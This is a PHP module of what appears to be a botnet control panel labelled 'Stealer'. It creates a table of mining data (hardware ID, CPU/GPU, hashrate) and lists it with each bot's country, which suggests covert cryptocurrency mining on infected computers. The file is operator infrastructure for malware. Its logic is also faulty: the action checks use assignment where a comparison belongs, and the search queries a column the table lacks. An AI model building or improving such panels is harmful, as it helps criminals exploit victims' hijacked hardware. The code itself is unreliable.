<?php
$TEMPLATE['site'] = "Stealer";

$install = false;
$TEMPLATE['text'] = '';
$TEMPLATE['js'] = '';
if (!db_table_exists('mining_data'))
{
	db_query('CREATE TABLE IF NOT EXISTS `mining_data` (
			`id` int(5) NOT NULL auto_increment,
			`hwid` varchar(65) NOT NULL default "",
			`used_hardware` varchar(3) NOT NULL default "?", /* CPU/GPU */
			`hashrate` int(16) NOT NULL default 0,
			`date` TIMESTAMP default CURRENT_TIMESTAMP,
			PRIMARY KEY (`id`)
			);');
	$TEMPLATE['text'] .= "Installed data table.<br />";
	$install = true;
}
if (!$install)
{
	$TEMPLATE['text'] = '';
	if (isset($_GET['a']) && isset($_GET['id']) && $_GET['a'] = 'del')
	{
		db_query("DELETE FROM `mining_data` WHERE `id` = :1", $_GET['id']);
		$TEMPLATE['text'] .= '<div class="alert alert-info">Deleted entry.</div>';
	}
	elseif (isset($_GET['a']) && $_GET['a'] = 'clear')
	{
		db_query("TRUNCATE TABLE `mining_data`");
		$TEMPLATE['text'] .= '<div class="alert alert-info">Cleared all entries.</div>';
	}


	$TEMPLATE['text'] .= '<a class="btn btn-danger" href="?p=module&m=Mining&a=clear"><i class="glyphicon glyphicon-trash"></i>&nbsp;Delete all Entries</a>
						<div style="height: 5px;"></div>
						<table class="table table-hover">
							<tr>
								<th>#</th>
								<th>HWID</th>
								<th>Country</th>
								<th>Hardware</th>
								<th>Hashrate</th>
								<th>Date</th>
								<th></th>
							</tr>';
	$search = isset($_GET['search']) ? $_GET['search'] : 'x';
	$WHERE = isset($_GET['search']) ? "`website` LIKE concat('%', :1, '%')" : ':1 = :1';
	$LIMIT = isset($_GET['n']) ? sprintf("%d, %d", intval($_GET['n']), (intval($_GET['n']) + 10)) : '0, 10';
	$stmt = db_query("SELECT *, (SELECT `country` FROM `bots` WHERE `hwid` = `mining_data`.`hwid`) AS `country` FROM `mining_data` WHERE $WHERE LIMIT $LIMIT",
							$search);
	while ($row = $stmt->fetch())
	{
		$TEMPLATE['text'] .= "			<tr>
											<td>{$row['id']}</td>
											<td>{$row['hwid']}</td>
											<td>{$row['country']}</td>
											<td>{$row['used_hardware']}</td>
											<td>{$row['hashrate']}</td>
											<td>{$row['date']}</td>
											<td style=\"width: 100px;\">
												<a href=\"?p=module&m=Mining&a=del&id={$row['id']}\" class=\"btn btn-danger\"><i class=\"glyphicon glyphicon-trash\"></i></a>
											</td>
										</tr>";
	}
	$TEMPLATE['text'] .= '</table>
						<div class="btn-group">
							<a href="?p=module&m=Mining&n='.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? intval($_GET['n']) - 10 : 0).'"><button type="button" class="btn btn-default">Back</button></a>
							<a><button type="button" class="btn btn-default">'.((isset($_GET['n']) && intval($_GET['n']) >= 10) ? (intval($_GET['n']) / 10 + 1) : 1).'</button></a>
							<a href="?p=module&m=Mining&n='.(isset($_GET['n']) ? intval($_GET['n']) + 10 : 10).'"><button type="button" class="btn btn-default">Next</button></a>
						</div>';
			
			
	$TEMPLATE['js'] = '';
}
?>